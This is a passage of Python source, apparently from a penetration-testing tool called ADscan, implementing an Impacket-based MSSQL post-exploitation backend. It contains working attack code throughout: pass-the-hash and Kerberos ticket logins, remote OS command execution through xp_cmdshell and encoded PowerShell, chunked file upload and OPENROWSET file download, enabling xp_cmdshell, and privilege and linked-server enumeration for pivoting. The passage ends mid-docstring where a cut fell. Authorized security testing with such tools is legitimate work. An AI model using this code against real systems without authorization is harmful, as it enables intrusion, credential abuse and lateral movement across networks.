"""Native MSSQL execution backend powered by Impacket.

This module provides a small, typed wrapper around Impacket's TDS client so
ADscan can keep using NetExec for discovery/control-plane while handling
complex post-exploitation operations through a stable Python API.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import os
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable

from adscan_internal import print_info_debug
from adscan_internal.command_runner import (
    build_execution_output_preview,
    build_text_preview,
    summarize_execution_result,
)
from adscan_internal.integrations.mssql.helpers import is_hash_authentication
from adscan_internal.integrations.mssql.models import (
    CommandExecution,
    IdentityFingerprint,
    ImpersonationGrant,
    IntegrityHint,
    LinkedServer,
    PivotChain,
    PivotHop,
    PrivilegeSweep,
    ServerLogin,
    XpCmdshellStatus,
    coalesce_permissions,
)
from adscan_internal.integrations.mssql import queries
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.auth_error_classification import (
    is_impacket_tds_kerberos_infra_error,
)

_EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"


@dataclass(frozen=True, slots=True)
class NativeMSSQLQueryResult:
    """Structured result returned by one native MSSQL query."""

    success: bool
    query: str
    rows: list[dict[str, Any]]
    stdout: str = ""
    stderr: str = ""
    error_message: str | None = None
    method: str | None = None


ClientFactory = Callable[[str, int, str], Any]


class ImpacketMSSQLBackend:
    """Execute MSSQL queries and OS commands through Impacket's TDS client."""

    def __init__(
        self,
        *,
        host: str,
        port: int = 1433,
        database: str = "master",
        client_factory: ClientFactory | None = None,
        kerberos_target_hostname: str | None = None,
        domain: str | None = None,
        kdc_host: str | None = None,
    ) -> None:
        from adscan_internal.services._kerberos_spn import (
            normalize_kerberos_target_hostname,
        )

        self.host = str(host)
        self.port = int(port)
        self.database = str(database)
        self._client_factory = client_factory or self._default_client_factory
        # KDC endpoint for impacket's self-minted AS-REQ/TGS-REQ. Impacket's
        # ``kerberosLogin`` resolves the KDC by DNS from the domain name when
        # ``kdcHost`` is None — which fails inside a container without AD DNS.
        # Pass the DC/KDC IP here so the Kerberos requests reach the right
        # endpoint regardless of container DNS. This is the transport target,
        # NOT a service SPN, so an IP is acceptable and must NOT be promoted to
        # an FQDN. Defaults to ``None`` to preserve legacy DNS-resolution
        # behavior for callers that do not supply it.
        self._kdc_host = str(kdc_host) if kdc_host else None
        # Impacket builds the Kerberos SPN as ``MSSQLSvc/<remoteName>:<port>``
        # from the third positional arg of ``tds.MSSQL(...)``. A short hostname
        # or IP yields a ticket the server rejects (same pattern as LDAP/SMB).
        # When no explicit FQDN is provided, fall back to ``host`` and promote
        # via the shared helper when a domain is known.
        self._kerberos_remote_name = (
            normalize_kerberos_target_hostname(kerberos_target_hostname, domain)
            or normalize_kerberos_target_hostname(self.host, domain)
            or self.host
        )

    @staticmethod
    def _default_client_factory(host: str, port: int, remote_name: str) -> Any:
        """Build the default Impacket MSSQL client."""
        from impacket import tds

        return tds.MSSQL(host, port=port, remoteName=remote_name)

    @staticmethod
    def _is_ccache_secret(secret: str | None) -> bool:
        """Return True when ``secret`` is a Kerberos ccache path, not a password."""
        return str(secret or "").strip().lower().endswith(".ccache")

    def execute_query(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        query: str,
        linked_server: str | None = None,
        timeout: int = 120,
        use_kerberos: bool = False,
        allow_ntlm_fallback: bool = False,
        ntlm_fallback_secret: str | None = None,
    ) -> NativeMSSQLQueryResult:
        """Execute one T-SQL query and return structured output.

        When ``use_kerberos`` is True (and the credential is Windows auth),
        Kerberos is used instead of NTLM. Defaults preserve legacy behavior.

        The NTLM fallback (``allow_ntlm_fallback``) reuses ``secret`` directly
        when it is a password / NT hash. When ``secret`` is a ``.ccache`` path
        Kerberos-only credential, that ticket cannot drive an NTLM bind — so a
        password / NT hash for the same principal must be supplied via
        ``ntlm_fallback_secret`` for the NTLM attempt to be queued. Without it
        no NTLM attempt is made, and the "retrying with NTLM" log below is not
        emitted (the log always reflects what is actually attempted). This is
        what lets an instance with no ``MSSQLSvc`` SPN — where Kerberos fails
        with ``KDC_ERR_S_PRINCIPAL_UNKNOWN`` — still be assessed over NTLM.
        """
        final_query = self._wrap_linked_query(query, linked_server)
        started_at = time.perf_counter()
        final_error: Exception | None = None
        # Each attempt is (use_kerberos, secret). The NTLM fallback slot is only
        # appended when an NTLM attempt can genuinely be made, so the retry log
        # below can never claim a fallback that was never queued.
        auth_attempts: list[tuple[bool, str]] = [(use_kerberos, secret)]
        if use_kerberos and allow_ntlm_fallback:
            if not self._is_ccache_secret(secret):
                # Kerberos was tried with a password / NT hash — reuse it for NTLM.
                auth_attempts.append((False, secret))
            elif ntlm_fallback_secret and not self._is_ccache_secret(
                ntlm_fallback_secret
            ):
                # ccache-only Kerberos credential: NTLM needs a real password /
                # NT hash for the same principal to attempt an SPN-less instance.
                auth_attempts.append((False, ntlm_fallback_secret))

        for index, (attempt_use_kerberos, attempt_secret) in enumerate(auth_attempts):
            has_ntlm_fallback_next = index + 1 < len(auth_attempts)
            client = self._client_factory(
                self.host, self.port, self._kerberos_remote_name
            )
            self._set_socket_timeout(client, timeout)
            try:
                if not self._authenticate(
                    client,
                    domain=domain,
                    username=username,
                    secret=attempt_secret,
                    use_kerberos=attempt_use_kerberos,
                ):
                    return NativeMSSQLQueryResult(
                        success=False,
                        query=final_query,
                        rows=[],
                        stderr="Native MSSQL login failed.",
                        error_message="Native MSSQL login failed.",
                    )

                rows = list(client.sql_query(final_query) or [])
                stderr, _infos = self._collect_reply_messages(client)
                stdout = self._rows_to_text(rows)
                success = not bool(stderr.strip())
                query_result = NativeMSSQLQueryResult(
                    success=success,
                    query=final_query,
                    rows=rows,
                    stdout=stdout,
                    stderr=stderr,
                    error_message=stderr or None,
                )
                self._log_query_debug(
                    query=final_query,
                    result=query_result,
                    username=username,
                    linked_server=linked_server,
                    duration_seconds=time.perf_counter() - started_at,
                )
                return query_result
            except Exception as exc:  # noqa: BLE001
                final_error = exc
                if (
                    attempt_use_kerberos
                    and has_ntlm_fallback_next
                    and self._is_kerberos_infra_error(exc)
                ):
                    print_info_debug(
                        "[mssql_native] Kerberos infra error — retrying with NTLM"
                    )
                    with contextlib.suppress(Exception):
                        client.disconnect()
                    continue
                query_result = NativeMSSQLQueryResult(
                    success=False,
                    query=final_query,
                    rows=[],
                    stderr=str(exc),
                    error_message=str(exc),
                )
                self._log_query_debug(
                    query=final_query,
                    result=query_result,
                    username=username,
                    linked_server=linked_server,
                    duration_seconds=time.perf_counter() - started_at,
                )
                return query_result
            finally:
                with contextlib.suppress(Exception):
                    client.disconnect()

        query_result = NativeMSSQLQueryResult(
            success=False,
            query=final_query,
            rows=[],
            stderr=str(final_error or "Native MSSQL login failed."),
            error_message=str(final_error or "Native MSSQL login failed."),
        )
        self._log_query_debug(
            query=final_query,
            result=query_result,
            username=username,
            linked_server=linked_server,
            duration_seconds=time.perf_counter() - started_at,
        )
        return query_result

    @staticmethod
    def _is_kerberos_infra_error(exc: BaseException) -> bool:
        """Return True when a Kerberos MSSQL failure is infrastructure-related."""
        return is_impacket_tds_kerberos_infra_error(exc)

    def execute_xp_cmdshell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        command: str,
        linked_server: str | None = None,
        timeout: int = 300,
        use_kerberos: bool = False,
        allow_ntlm_fallback: bool = False,
    ) -> NativeMSSQLQueryResult:
        """Execute one operating-system command via ``xp_cmdshell``."""
        escaped_command = self._escape_tsql_literal(command)
        wrapped_linked_server: str | None = linked_server
        if linked_server:
            escaped_linked_server = str(linked_server).replace("]", "]]")
            query = f"EXEC ('xp_cmdshell ''{escaped_command}''') AT [{escaped_linked_server}]"
            wrapped_linked_server = None
        else:
            query = f"EXEC master..xp_cmdshell '{escaped_command}'"
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            linked_server=wrapped_linked_server,
            timeout=timeout,
            use_kerberos=use_kerberos,
            allow_ntlm_fallback=allow_ntlm_fallback,
        )
        return NativeMSSQLQueryResult(
            success=result.success,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            error_message=result.error_message,
            method="linked_xp_cmdshell_native"
            if linked_server
            else "xp_cmdshell_native",
        )

    def execute_powershell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        encoded_command: str,
        linked_server: str | None = None,
        timeout: int = 300,
        use_kerberos: bool = False,
        allow_ntlm_fallback: bool = False,
    ) -> NativeMSSQLQueryResult:
        """Execute one encoded PowerShell payload through ``xp_cmdshell``."""
        command = f"powershell.exe -EncodedCommand {encoded_command}"
        return self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=command,
            linked_server=linked_server,
            timeout=timeout,
            use_kerberos=use_kerberos,
            allow_ntlm_fallback=allow_ntlm_fallback,
        )

    def upload_file(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        local_path: str,
        remote_path: str,
        linked_server: str | None = None,
        timeout: int = 300,
        chunk_size: int = 1024,
    ) -> NativeMSSQLQueryResult:
        """Upload one file via ``xp_cmdshell`` + base64 chunks + PowerShell decode."""
        local_file = Path(local_path)
        data = local_file.read_bytes()
        encoded_data = base64.b64encode(data).decode("ascii")
        remote_b64_path = f"{remote_path}.b64"
        queries: list[NativeMSSQLQueryResult] = []
        total_chunks = -(-len(encoded_data) // chunk_size)  # ceil division

        print_info_debug(
            f"[native_backend] upload_file start "
            f"local={mark_sensitive(local_path, 'path')} "
            f"remote={mark_sensitive(remote_path, 'path')} "
            f"linked_server={mark_sensitive(linked_server or 'none', 'hostname')} "
            f"file_bytes={len(data)} b64_chars={len(encoded_data)} "
            f"chunks={total_chunks} chunk_size={chunk_size}"
        )

        # Ensure we do not append to stale data from previous runs.
        delete_command = f'cmd /c del /f /q "{remote_b64_path}" 2>nul'
        queries.append(
            self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=delete_command,
                linked_server=linked_server,
                timeout=timeout,
            )
        )

        for index in range(0, len(encoded_data), chunk_size):
            chunk = encoded_data[index : index + chunk_size]
            chunk_num = index // chunk_size + 1
            # First chunk uses single '>' (overwrite/create) so that any stale .b64
            # from a previous run that the pre-delete failed to remove is always
            # truncated.  Subsequent chunks append with '>>'.
            redirect = ">" if index == 0 else ">>"
            append_command = f'cmd /c echo {chunk}{redirect}"{remote_b64_path}"'
            chunk_result = self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=append_command,
                linked_server=linked_server,
                timeout=timeout,
            )
            queries.append(chunk_result)
            if not chunk_result.success:
                print_info_debug(
                    f"[native_backend] upload_file chunk FAILED "
                    f"chunk={chunk_num}/{total_chunks} "
                    f"remote_b64={mark_sensitive(remote_b64_path, 'path')} "
                    f"error={mark_sensitive(chunk_result.error_message or '(none)', 'text')}"
                )
                return self._collapse_results(
                    queries,
                    error_message=f"Failed to upload base64 chunk {chunk_num}/{total_chunks} to {remote_b64_path}.",
                )

        print_info_debug(
            f"[native_backend] upload_file chunks done "
            f"chunks={total_chunks} remote_b64={mark_sensitive(remote_b64_path, 'path')}"
        )

        # Delete any stale target file so that Test-Path verification after decode
        # cannot falsely pass because an old file from a previous run still exists.
        delete_target_command = f'cmd /c del /f /q "{remote_path}" 2>nul'
        queries.append(
            self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=delete_target_command,
                linked_server=linked_server,
                timeout=timeout,
            )
        )

        decode_command = self._build_ps_decode_command(remote_b64_path, remote_path)
        print_info_debug(
            f"[native_backend] upload_file decode start "
            f"b64={mark_sensitive(remote_b64_path, 'path')} "
            f"target={mark_sensitive(remote_path, 'path')}"
        )
        decode_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=decode_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(decode_result)
        _decode_stdout = str(decode_result.stdout or "").strip()
        print_info_debug(
            f"[native_backend] upload_file decode result "
            f"success={decode_result.success} "
            f"stdout={mark_sensitive(_decode_stdout[:300] or '(empty)', 'text')}"
        )

        # Verify the target file was actually written — the PowerShell decode
        # step emits no stdout on success, but if it threw an exception the
        # output contains the error message.  Check with Test-Path so we can
        # surface a clear error instead of silently proceeding with a missing file.
        verify_ps = f"if (Test-Path -LiteralPath '{remote_path}') {{ 'ok' }} else {{ throw 'decoded file not found: {remote_path}' }}"
        verify_encoded = base64.b64encode(verify_ps.encode("utf-16-le")).decode("ascii")
        verify_command = f"powershell.exe -NoP -NonI -EncodedCommand {verify_encoded}"
        verify_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=verify_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(verify_result)
        _verify_stdout = str(verify_result.stdout or "").strip()
        _verify_ok = "ok" in _verify_stdout.lower()
        print_info_debug(
            f"[native_backend] upload_file verify result "
            f"ok={_verify_ok} "
            f"stdout={mark_sensitive(_verify_stdout[:300] or '(empty)', 'text')}"
        )
        if not _verify_ok:
            return self._collapse_results(
                queries,
                error_message=(
                    f"PowerShell base64 decode did not produce the target file '{remote_path}'. "
                    + (
                        f"Decode output: {_decode_stdout[:300]}"
                        if _decode_stdout
                        else "No decode output."
                    )
                ),
            )
        cleanup_command = f'cmd /c del /f /q "{remote_b64_path}"'
        cleanup_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=cleanup_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(cleanup_result)
        _cleanup_stdout = str(cleanup_result.stdout or "").strip()
        print_info_debug(
            f"[native_backend] upload_file complete "
            f"remote={mark_sensitive(remote_path, 'path')} "
            f"file_bytes={len(data)} "
            f"b64_cleanup={'ok' if not _cleanup_stdout else mark_sensitive(_cleanup_stdout[:200], 'text')}"
        )
        return self._collapse_results(
            queries,
            success_hint="Native MSSQL upload completed.",
        )

    def download_file(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        remote_path: str,
        local_path: str,
        linked_server: str | None = None,
        timeout: int = 300,
    ) -> NativeMSSQLQueryResult:
        """Download one file using ``OPENROWSET(BULK ...)`` when available."""
        escaped_remote_path = self._escape_tsql_literal(remote_path)
        query = (
            "SELECT * FROM OPENROWSET(BULK N'"
            f"{escaped_remote_path}"
            "', SINGLE_BLOB) AS FileContent"
        )
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            linked_server=linked_server,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return NativeMSSQLQueryResult(
                success=False,
                query=result.query,
                rows=result.rows,
                stdout=result.stdout,
                stderr=result.stderr,
                error_message=result.error_message
                or "Native MSSQL download returned no rows.",
                method="openrowset_bulk_native",
            )

        file_bytes = self._extract_bulk_bytes(result.rows[0])
        if file_bytes is None:
            return NativeMSSQLQueryResult(
                success=False,
                query=result.query,
                rows=result.rows,
                stdout=result.stdout,
                stderr=result.stderr,
                error_message="Could not decode MSSQL BULK download payload.",
                method="openrowset_bulk_native",
            )

        destination = Path(local_path)
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(file_bytes)
        return NativeMSSQLQueryResult(
            success=True,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            method="openrowset_bulk_native",
        )

    @staticmethod
    def _collapse_results(
        results: list[NativeMSSQLQueryResult],
        *,
        success_hint: str | None = None,
        error_message: str | None = None,
    ) -> NativeMSSQLQueryResult:
        """Collapse a sequence of query results into one summary result."""
        combined_stdout = "\n".join(
            entry.stdout.strip() for entry in results if str(entry.stdout or "").strip()
        ).strip()
        combined_stderr = "\n".join(
            entry.stderr.strip() for entry in results if str(entry.stderr or "").strip()
        ).strip()
        success = all(entry.success for entry in results)
        if success and success_hint:
            combined_stdout = (
                f"{combined_stdout}\n{success_hint}".strip()
                if combined_stdout
                else success_hint
            )
        return NativeMSSQLQueryResult(
            success=success,
            query=";\n".join(entry.query for entry in results if entry.query),
            rows=[],
            stdout=combined_stdout,
            stderr=combined_stderr,
            error_message=None
            if success
            else (error_message or combined_stderr or None),
            method=results[-1].method if results else None,
        )

    def _authenticate(
        self,
        client: Any,
        *,
        domain: str,
        username: str,
        secret: str,
        use_kerberos: bool = False,
    ) -> bool:
        """Authenticate against MSSQL using password, NTLM hash, or Kerberos."""
        if self._is_ccache_secret(secret):
            with self._temporary_kerberos_env(secret):
                return bool(
                    client.kerberosLogin(
                        self.database,
                        username,
                        "",
                        domain,
                        kdcHost=self._kdc_host,
                        useCache=True,
                    )
                )

        if is_hash_authentication(secret):
            hash_value = f"{_EMPTY_LM_HASH}:{secret}"
            if use_kerberos and bool(domain):
                return bool(
                    client.kerberosLogin(
                        self.database,
                        username,
                        "",
                        domain,
                        hashes=hash_value,
                        kdcHost=self._kdc_host,
                        useCache=False,
                    )
                )
            return bool(
                client.login(
                    self.database,
                    username,
                    "",
                    domain,
                    hashes=hash_value,
                    useWindowsAuth=bool(domain),
                )
            )

        if use_kerberos and bool(domain):
            return bool(
                client.kerberosLogin(
                    self.database,
                    username,
                    secret,
                    domain,
                    kdcHost=self._kdc_host,
                    useCache=False,
                )
            )

        return bool(
            client.login(
                self.database,
                username,
                secret,
                domain,
                useWindowsAuth=bool(domain),
            )
        )

    @staticmethod
    def _set_socket_timeout(client: Any, timeout: int) -> None:
        """Apply a best-effort socket timeout to the underlying Impacket client."""
        with contextlib.suppress(Exception):
            client.connect()
        socket_obj = getattr(client, "socket", None)
        with contextlib.suppress(Exception):
            if socket_obj is not None:
                socket_obj.settimeout(timeout)

    @staticmethod
    def _collect_reply_messages(client: Any) -> tuple[str, list[str]]:
        """Collect reply messages without printing them to the user."""
        errors: list[str] = []
        infos: list[str] = []
        with contextlib.suppress(Exception):
            client.printReplies(
                error_logger=lambda message: errors.append(str(message)),
                info_logger=lambda message: infos.append(str(message)),
            )
        return "\n".join(item for item in errors if item).strip(), infos

    @staticmethod
    def _rows_to_text(rows: list[dict[str, Any]]) -> str:
        """Convert MSSQL result rows to a readable stdout representation."""
        lines: list[str] = []
        for row in rows:
            if not isinstance(row, dict):
                text = str(row).strip()
                if text:
                    lines.append(text)
                continue
            if "output" in row:
                text = ImpacketMSSQLBackend._decode_value(row.get("output")).strip()
                if text:
                    lines.append(text)
                continue
            values = [
                ImpacketMSSQLBackend._decode_value(value).strip()
                for value in row.values()
                if value is not None
            ]
            joined = " ".join(item for item in values if item).strip()
            if joined:
                lines.append(joined)
        return "\n".join(lines).strip()

    @staticmethod
    def _build_ps_decode_command(b64_path: str, target_path: str) -> str:
        """Build a ``powershell.exe -EncodedCommand`` that decodes a base64 file.

        Replaces ``certutil -decode`` which fails silently on some systems when
        the encoded data contains CRLF line endings produced by ``cmd /c echo``.
        The PowerShell approach strips all non-base64 characters before decoding,
        making it immune to trailing CRLF, spaces, or other echo artefacts.

        Uses ``-EncodedCommand`` (UTF-16-LE base64) so no quoting or SQL-escaping
        issues arise regardless of path characters.
        """
        # PS uses single-quoted strings so backslashes are literal.
        ps_script = (
            f"$r=(Get-Content '{b64_path}' -Encoding ASCII)-join'';"
            f"$r=$r.Trim()-replace'[^A-Za-z0-9+/=]','';"
            f"[IO.File]::WriteAllBytes('{target_path}',[Convert]::FromBase64String($r))"
        )
        encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
        return f"powershell.exe -NoP -NonI -EncodedCommand {encoded}"

    def _log_query_debug(
        self,
        *,
        query: str,
        result: NativeMSSQLQueryResult,
        username: str,
        linked_server: str | None,
        duration_seconds: float,
    ) -> None:
        """Emit one debug summary for a native MSSQL operation."""
        try:
            query_preview = build_text_preview(query, head=20, tail=20)
            print_info_debug(
                "[mssql_native] Query:\n"
                + mark_sensitive(query_preview or query, "text"),
                panel=True,
            )
            synthetic_result = subprocess.CompletedProcess(
                args="[mssql_native]",
                returncode=0 if result.success else 1,
                stdout=result.stdout or "",
                stderr=result.stderr or "",
            )
            setattr(synthetic_result, "_adscan_elapsed_seconds", duration_seconds)
            exit_code, stdout_count, stderr_count, duration_text = (
                summarize_execution_result(synthetic_result)
            )
            query_hash = hashlib.sha1((query or "").encode("utf-8")).hexdigest()[:12]
            query_lines = len(
                [line for line in (query or "").splitlines() if line.strip()]
            )
            print_info_debug(
                "[mssql_native] Result: "
                f"host={mark_sensitive(self.host, 'hostname')}, "
                f"user={mark_sensitive(username, 'user')}, "
                f"linked_server={mark_sensitive(linked_server, 'hostname') if linked_server else 'none'}, "
                f"query_sha1={query_hash}, "
                f"query_lines={query_lines}, "
                f"exit_code={exit_code}, "
                f"stdout_lines={stdout_count}, "
                f"stderr_lines={stderr_count}, "
                f"success={result.success}, "
                f"duration={duration_text}"
            )
            preview_text = build_execution_output_preview(
                synthetic_result,
                stdout_head=12,
                stdout_tail=12,
                stderr_head=12,
                stderr_tail=12,
            )
            if preview_text:
                print_info_debug(
                    "[mssql_native] Output preview:\n"
                    + mark_sensitive(preview_text, "text"),
                    panel=True,
                )
        except Exception:
            return

    @staticmethod
    def _decode_value(value: Any) -> str:
        """Decode one MSSQL cell value into text."""
        if value is None:
            return ""
        if isinstance(value, bytes):
            for encoding in ("utf-8", "utf-16le", "latin-1"):
                with contextlib.suppress(Exception):
                    return value.decode(encoding)
            return value.hex()
        return str(value)

    @staticmethod
    def _extract_bulk_bytes(row: dict[str, Any]) -> bytes | None:
        """Decode the payload returned by ``OPENROWSET(BULK ...)``."""
        if not isinstance(row, dict) or not row:
            return None
        value = next(iter(row.values()))
        if isinstance(value, (bytes, bytearray)):
            with contextlib.suppress(ValueError):
                return bytes.fromhex(bytes(value).decode("ascii"))
            return bytes(value)
        if isinstance(value, str):
            with contextlib.suppress(ValueError):
                return bytes.fromhex(value)
            with contextlib.suppress(Exception):
                return base64.b64decode(value, validate=True)
        return None

    @staticmethod
    def _wrap_linked_query(query: str, linked_server: str | None) -> str:
        """Wrap one query for execution against a linked SQL server."""
        if not linked_server:
            return query
        escaped_query = query.replace("'", "''")
        escaped_linked_server = str(linked_server).replace("]", "]]")
        return f"EXEC ('{escaped_query}') AT [{escaped_linked_server}]"

    @staticmethod
    def _escape_tsql_literal(value: str) -> str:
        """Escape one value for safe inclusion inside a T-SQL string literal."""
        return str(value or "").replace("'", "''")

    @staticmethod
    @contextlib.contextmanager
    def _temporary_kerberos_env(ticket_path: str):
        """Temporarily point ``KRB5CCNAME`` at one ccache file."""
        previous = os.environ.get("KRB5CCNAME")
        os.environ["KRB5CCNAME"] = str(ticket_path)
        try:
            yield
        finally:
            if previous is None:
                os.environ.pop("KRB5CCNAME", None)
            else:
                os.environ["KRB5CCNAME"] = previous

    # ------------------------------------------------------------------
    # Native enumeration — replaces NetExec subprocess calls
    # ------------------------------------------------------------------

    def fingerprint_identity(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        timeout: int = 60,
    ) -> IdentityFingerprint | None:
        """Confirm the effective identity established by the login.

        Returns ``None`` if the connection cannot complete or the server
        rejects the credentials. Callers that want a hard failure should
        wrap this with their own error handling — this method intentionally
        never raises so it is safe to call as a probe.
        """
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.IDENTITY_FINGERPRINT,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return None
        row = result.rows[0]
        return IdentityFingerprint(
            login_name=str(row.get("login_name") or "").strip(),
            system_user=str(row.get("system_user") or "").strip(),
            original_login=str(row.get("original_login") or "").strip(),
            server_name=str(row.get("server_name") or "").strip(),
            server_version=str(row.get("server_version") or "").strip(),
            product_version=str(row.get("product_version") or "").strip(),
            edition=str(row.get("edition") or "").strip(),
            current_database=str(row.get("current_database") or "").strip(),
        )

    def sweep_privileges(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        timeout: int = 90,
    ) -> PrivilegeSweep | None:
        """Build a one-shot privilege fingerprint for the current login.

        Replaces what NetExec spreads across the ``mssql_priv``,
        ``enum_links`` and ``enable_cmdshell`` modules with a sequence of
        in-process queries against the same impacket TDS connection. The
        whole sweep typically completes in under a second on a LAN.
        """
        identity = self.fingerprint_identity(
            domain=domain, username=username, secret=secret, timeout=timeout
        )
        if identity is None:
            return None

        started_at = time.perf_counter()

        is_sysadmin = self._scalar_bool(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.IS_SYSADMIN,
            column="is_sysadmin",
            timeout=timeout,
        )

        permissions_result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.EFFECTIVE_SERVER_PERMISSIONS,
            timeout=timeout,
        )
        permissions = (
            coalesce_permissions(permissions_result.rows)
            if permissions_result.success
            else ()
        )

        impersonate_result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.IMPERSONABLE_PRINCIPALS,
            timeout=timeout,
        )
        impersonable = tuple(
            str(row.get("name") or "").strip()
            for row in impersonate_result.rows
            if str(row.get("name") or "").strip()
        )

        xp_status, advanced_on = self._read_xp_cmdshell_state(
            domain=domain, username=username, secret=secret, timeout=timeout
        )

        owned_dbs_result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.OWNED_DATABASES,
            timeout=timeout,
        )
        owned = tuple(
            str(row.get("database_name") or "").strip()
            for row in owned_dbs_result.rows
            if str(row.get("database_name") or "").strip()
        )

        trusted = ()
        if is_sysadmin:
            # sys.databases.is_trustworthy_on requires VIEW SERVER STATE,
            # which non-sysadmins typically lack. Skipping the query for
            # non-sysadmins avoids a noisy permission-denied message.
            trusted_result = self.execute_query(
                domain=domain,
                username=username,
                secret=secret,
                query=queries.TRUSTED_DATABASES_OWNED_BY_SYSADMIN,
                timeout=timeout,
            )
            trusted = tuple(
                str(row.get("database_name") or "").strip()
                for row in trusted_result.rows
                if str(row.get("database_name") or "").strip()
            )

        linked_servers = self.enumerate_linked_servers(
            domain=domain, username=username, secret=secret, timeout=timeout
        )

        return PrivilegeSweep(
            identity=identity,
            is_sysadmin=is_sysadmin,
            server_permissions=permissions,
            impersonable_principals=impersonable,
            xp_cmdshell=xp_status,
            show_advanced_options_enabled=advanced_on,
            owned_databases=owned,
            trustworthy_databases_owned_by_sysadmin=trusted,
            linked_servers=linked_servers,
            duration_seconds=time.perf_counter() - started_at,
        )

    def enumerate_linked_servers(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        timeout: int = 60,
    ) -> tuple[LinkedServer, ...]:
        """Return the linked servers reachable from the current connection.

        Tries the rich ``sys.servers`` query first; falls back to
        ``sp_linkedservers`` on permission errors. The login mapping is
        merged on a best-effort basis — non-sysadmins frequently cannot
        read ``sp_helplinkedsrvlogin`` and we render those rows without the
        mapping rather than failing the whole enumeration.
        """
        detail = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.LINKED_SERVERS_DETAIL,
            timeout=timeout,
        )
        rows: list[LinkedServer] = []
        if detail.success and detail.rows:
            for row in detail.rows:
                name = str(row.get("linked_server") or "").strip()
                if not name:
                    continue
                rows.append(
                    LinkedServer(
                        name=name,
                        product=str(row.get("product") or "").strip(),
                        provider=str(row.get("provider") or "").strip(),
                        data_source=str(row.get("data_source") or "").strip(),
                        rpc_out_enabled=_truthy(row.get("rpc_out")),
                        data_access_enabled=_truthy(row.get("data_access")),
                    )
                )
        else:
            fallback = self.execute_query(
                domain=domain,
                username=username,
                secret=secret,
                query=queries.LINKED_SERVERS_BASIC,
                timeout=timeout,
            )
            if fallback.success:
                for row in fallback.rows:
                    name = str(row.get("SRV_NAME") or row.get("name") or "").strip()
                    if not name:
                        continue
                    rows.append(LinkedServer(name=name))

        if not rows:
            return ()

        # Best-effort login map enrichment.
        login_map = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=queries.LINKED_SERVERS_LOGIN_MAP,
            timeout=timeout,
        )
        if login_map.success and login_map.rows:
            mapping: dict[str, list[tuple[str, str]]] = {}
            for row in login_map.rows:
                linked_name = str(row.get("Linked Server") or "").strip()
                if not linked_name:
                    continue
                local = str(row.get("Local Login") or "").strip() or "—"
                remote = str(row.get("Remote Login") or "").strip() or "—"
                mapping.setdefault(linked_name, []).append((local, remote))
            rows = [
                LinkedServer(
                    name=server.name,
                    product=server.product,
                    provider=server.provider,
                    data_source=server.data_source,
                    rpc_out_enabled=server.rpc_out_enabled,
                    data_access_enabled=server.data_access_enabled,
                    local_to_remote_logins=tuple(mapping.get(server.name, [])),
                )
                for server in rows
            ]

        return tuple(rows)

    def enable_xp_cmdshell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        linked_server: str | None = None,
        timeout: int = 60,
    ) -> NativeMSSQLQueryResult:
        """Toggle ``xp_cmdshell`` on locally or on a linked server.

        Sysadmin is required. The two-statement batch (``sp_configure
        'show advanced options'`` + ``sp_configure 'xp_cmdshell'``) is sent
        in one round-trip when running locally to minimise the chance of
        leaving the server in a half-configured state.
        """
        if linked_server:
            query = queries.enable_xp_cmdshell_on_link(linked_server)
        else:
            query = queries.ENABLE_XP_CMDSHELL
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            timeout=timeout,
        )
        return NativeMSSQLQueryResult(
            success=result.success,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            error_message=result.error_message,
            method="enable_xp_cmdshell_native" + ("_linked" if linked_server else ""),
        )

    def disable_xp_cmdshell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        restore_advanced_options: bool = False,
        timeout: int = 60,
    ) -> NativeMSSQLQueryResult:
        """Toggle ``xp_cmdshell`` back off locally and restore advanced options.

        Symmetric counterpart of :meth:`enable_xp_cmdshell`, used by cleanup
        paths to revert a configuration change ADscan made itself (e.g. an
        enable that turned out not to be usable by the current principal).
        ``xp_cmdshell`` is always set to ``0``; ``show advanced options`` is
        restored to ``restore_advanced_options`` -- pass the value observed
        BEFORE the enable so a box that already had advanced options on is
        left exactly as it was found.

